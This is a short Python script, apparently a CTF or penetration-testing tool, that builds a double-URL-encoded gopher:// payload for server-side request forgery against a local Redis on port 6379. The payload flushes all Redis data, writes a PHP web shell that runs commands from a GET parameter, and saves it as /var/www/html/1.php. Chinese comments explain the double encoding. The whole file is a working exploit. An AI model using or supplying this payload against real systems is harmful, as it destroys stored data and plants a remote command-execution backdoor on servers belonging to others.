import urllib.parse

def resp_cmd(*args):
    return f"*{len(args)}\r\n" + "".join(f"${len(arg)}\r\n{arg}\r\n" for arg in args)

commands = [
    ["flushall"],
    ["set", "a", '<?php system($_GET["cmd"]);?>'],
    ["config", "set", "dir", "/var/www/html"],
    ["config", "set", "dbfilename", "1.php"],
    ["save"]
]

payload = "".join(resp_cmd(*cmd) for cmd in commands)
# 如果环境需要两次解码，使用二次编码
encoded_once = urllib.parse.quote(payload, safe='')
encoded_twice = urllib.parse.quote(encoded_once, safe='')  # 二次编码
gopher_url = f"gopher://127.0.0.1:6379/_{encoded_twice}"
print(gopher_url)